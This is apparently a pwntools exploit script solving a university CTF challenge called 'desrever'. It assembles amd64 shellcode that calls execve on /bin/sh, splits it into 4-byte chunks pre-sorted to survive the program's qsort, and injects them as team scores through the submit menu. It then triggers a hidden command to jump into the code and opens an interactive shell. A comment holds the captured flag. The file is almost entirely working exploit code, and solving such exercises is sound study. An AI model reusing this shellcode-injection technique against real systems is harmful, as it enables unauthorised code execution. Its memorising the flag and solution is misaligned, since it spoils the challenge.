from pwn import *
import string
from sys import argv
import os
import time
import subprocess

context.arch = 'amd64'
context.os = 'linux'
info = log.info
#context.log_level = 'debug'

binfile = './vuln'
elf = context.binary = ELF(binfile)


# for debugging
gdbscript = '''
file /gdbscript/vuln
#main:
#b *$base("vuln")+0x1551
#command
#p "main"
#end
#submit:
#b *$base("vuln")+0x1318
#command
#p "submit"
#end
#qsort call
#b *$base("vuln")+0x13fa
#command
#p "qsort call"
#end
#view:
#b *$base("vuln")+0x144f
#command
#p "view"
#end
#magic:
b *$base("vuln")+0x1533
command
p "magic"
end
#set pagination off
'''.format(**locals())
with open("gdbscript", "w") as f:
    f.write(gdbscript)


# start remote
p = remote('tasks.ws24.softsec.rub.de', 33765)

#p=remote("127.0.0.1", 1025)
#p2=process('tmux split-window -h docker exec -ti $(docker ps -q -f "ancestor=softsec/desrever") /bin/sh -c \'gdb -x /gdbscript/gdbscript -p $(pgrep -n vuln)\'', shell=True)
sleep(4)
#p2.close()


def cyclic_find_bytes(b):
    to_be_found = bytes.fromhex(hex(b)[2:])[::-1]
    return cyclic_find(to_be_found)


def submit(team, score):
    p.sendline(b"submit")
    p.recvuntil(b"Enter the team name: ")
    p.sendline(team)
    p.recvuntil(b"Enter the score for the task: ")
    p.sendline(score)

def view():
    p.sendline(b"view")
    return p.recvuntil(b"> ")[:-3]

def magic():
    p.sendline("".join([chr(ord(a)-3) for a in list("pdjlf")]).encode())


def bytes_to_int_text(by):
    return str(int(by[::-1].hex(), 16)).encode()

import binascii

#print(shellcraft.amd64.linux.sh())
payload = asm("""
mov rdx, rdi
std

mov rcx, rdi
std

mov rax, rdi
std

mov rsi, rax
std

mov rbx, [rbx]
cld

mov rdi, [rbx]
stc

mov al, 0x3b
nop
nop
syscall
""")
print(disasm(payload))
payload_parts = []
for i in range(0, len(payload), 4):
    print(payload[i:i+4][::-1].hex())
    payload_parts.append(payload[i:i+4].hex())

def sort_by_other_byte_order(by):
    return binascii.unhexlify("".join(by))[::-1].hex()

payload_parts = sorted(payload_parts, key=sort_by_other_byte_order, reverse=True)
payload_sorted = binascii.unhexlify("".join(payload_parts))
print(disasm(payload_sorted))
for i in range(0, len(payload_sorted), 4):
    print(payload_sorted[i:i+4][::-1].hex())

    if i == 0:
        name = b"/bin/sh"
    else:
        name = f"{i}".encode()
    submit(name, bytes_to_int_text(payload_sorted[i:i+4]))

magic()

p.interactive()

#softsec{i9A0yWy5HODdyhhMcqq71cjAMhLbVAEI9Mh13wJNDUhkIEKb8DalZSRjvNYuKNtG}


# http://ref.x86asm.net/coder32.html
# http://xxeo.com/single-byte-or-small-x86-opcodes